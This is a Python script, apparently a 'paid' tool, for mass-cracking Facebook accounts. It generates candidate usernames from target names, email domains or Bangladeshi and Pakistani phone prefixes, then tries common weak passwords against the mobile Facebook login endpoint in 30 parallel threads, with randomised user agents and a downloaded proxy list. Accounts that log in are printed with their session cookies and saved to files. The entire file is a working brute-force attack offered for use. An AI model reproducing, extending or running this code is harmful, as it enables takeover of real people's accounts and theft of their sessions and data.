import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
#---color---#
G='\033[38;5;46m'
R='\033[38;5;196m'
Y='\33[1;33m'
W='\033[1;37m'
B='\033[1;34m'
P='\033[38;5;203m'
X='\033[38;5;208m'
T='\033[100m'
C='\033[1;33m'
E='\033[m'
S='\033[38;5;47m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xn in range(1000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0','7.1.1','8.0.0','9','10','11','12','13'])
	c='D5322 Build/19.4.A.0.182; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.randrange(73,100)
	h='0'
	i=random.randrange(4200,4900)
	j=random.randrange(40,150)
	k='Mobile Safari/537.36'
	xn=f'{a} {b};{c}{d}{e}{f}{g}.{h}.{i}.{j}{k}'
	ugen.append(xn)
logo = (f"""
  \33[1;32m   
   \33[1;33m 
 \33[1;31m  
  \33[1;34m
\33[1;32m  
----------------------------------------------

\033[1;92m----------------------------------------------
{W}[{G}√{W}] TOOLS TYPE:\033[1;32m PAID
{W}[{G}√{W}] AUTHOR    :\033[1;32m JAHID HOSSEN
{W}[{G}√{W}] GITHUB    :\033[1;32m JAHID-143
{W}[{G}√{W}] FACEBOOK  :\033[1;32m JAHID
\033[1;92m----------------------------------------------""")

class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(f"{W}[{G}1{W}] FACEBOOK EMAIL ID CLONING     \033[1;91m[WORxyz] ")
        print(f"{W}[{G}2{W}] FACEBOOK USERNAME CLONING     \033[1;35m[BEST]")
        print(f"{W}[{G}3{W}] FACEBOOK VIP RANDOM CLONING   \033[1;33m[FIRE]")
        print(f"{W}[{G}0{W}] Exit")
        print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        JAHID =input(" [√] Choose : ")
        if JAHID in ["1", "01"]:
            v1()
        if JAHID in ["2", "02"]:
            v2()
        if JAHID in ["3","03"]:
            v3()
        if JAHID in [" 0", "00"]:
            exit()
        else:
            exit()
def v1():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(f'{W}[{G}√{W}]{G} TERGET FIRST NAME : ')
    kodex = input(f'{W}[{G}√{W}]{G} TERGET LAST NAME :  ')
    print(f'{W}[{G}√{W}]{G} example Doamin : @gmail.com, @yahoo.com ')
    doamin = input(f'{W}[{G}√{W}]{G} Input Doamin  : ')
    limit = int(input(f'{W}[{G}√{W}]{G} ENTET YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'{W}[{G}√{W}]{G} Total ids:\033[1;92m '+tl)
        print(f"{W}[{G}√{W}]{G} Target Doamin:\033[1;92m {doamin}")
        print(f'{W}[{G}√{W}]{G} The process has been started')
        print(f'{W}[{G}√{W}]{G} Wait for ids ')
        print(42*'_')
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kodex+'@@@',kodex+'@@',kodex+'786',kodex+'1122']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(42*'_')
    print(f'{W}[{G}√{W}]{G} Crack process has been completed')
    print(f'{W}[{G}√{W}]{G} Ids saved in ok.txt,cp.txt')
    print(42*'_')
def v2():
    user=[]
    os.system('clear')
    print(logo)
    kode = input(f'{W}[{G}√{W}]{G} TERGET FIRST NAME : ')
    kodex = input(f'{W}[{G}√{W}]{G} TERGET FIRST NAME :  ')
    doamin = '.'
    limit = int(input(f'{W}[{G}√{W}]{G} ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'{W}[{G}√{W}]{G} Total ids:\033[1;92m '+tl)
        print(f"{W}[{G}√{W}]{G} Target Doamin:\033[1;92m Facebook CLONING (name)")
        print(f'{W}[{G}√{W}]{G} The process has been started')
        print(f'{W}[{G}√{W}]{G} Wait for ids ')
        print(42*'_')
        for guru in user:
            uid = kode+doamin+kodex+guru
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345',kodex+'@@@',kodex+'@@',kodex+'786',kodex+'1122']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(42*'_')
    print(f'{W}[{G}√{W}]{G} Crack process has been completed')
    print(f'{G}[{G}√{W}]{G} Ids saved in ok.txt,cp.txt')
    print(42*'_')
def v3():
    user=[]
    os.system('clear')
    print(logo)
    print(" BD SIM CODE=><>< +88017,+88018,+88019,+88014")
    print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" \033[1;32mPAK SIM CODE=><>< +92301,+92302,+92303,+92305")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    print(" NOTE ; THOSE  WHO STAY IN THEIR COUNTRY THEY CAN GIVE THEIR SIM CODE NUNBER TO FACEBOOK RANDOM ID CLONE")
    print(" \033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
    
    kode = input(f'{W}[{G}√{W}]{G} ENTER SIM CODE: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' FACEBOOK VIP CLONING '
    limit = int(input(f'{W}[{G}√{W}]{G} ENTER YOUR CRACK LIMiT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'{W}[{G}√{W}]{G} TOTAL IDS :\033[1;92m '+tl)
        print(f"{W}[{G}√{W}]{G} YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
        print(f'{W}[{G}√{W}]{G} THE CRACK PROCESS HAS BEEN STARTED')
        print(f'{W}[{G}√{W}]{G} WAIT FOR IDS ')
        print(42*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'Bangladesh','bangladesh','bangla','Bangla','i love you','free fire','@#@#@#','@@@###','jannat','sadiya','203040','405060','708090','102030','304050','nusrat','mimmim','fatema','farjana','soniya','tamanna','lamiya','nadiya','shakib','habiba','mababa','mahadi','samiya','sumaiya','shathi','muniya','mehadi','parvej','sultana','robiul','jumana','yeasin']
            yaari.submit(rcrack1,uid,pwx,tl)
    print(42*'_')
    print(f'{W}[{G}√{W}]{G} Crack process has been completed')
    print(f'{W}[{G}√{W}]{G} Ids saved in ok.txt,cp.txt')
    print(42*'_')
def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r[\033[1;92mJAHID\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'm.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'referer': 'https://www.google.com/',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[JAHID-OK💉] {cid}|{ps}")
                print(f"{B}[COOKIE💉] : {coki}")
                open('/sdcard/JAHID/ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f"\x1b[38;5;196m[JAHID-CP❌] {uid}|{ps}")
                open('/sdcard/JAHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHID-xyz💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
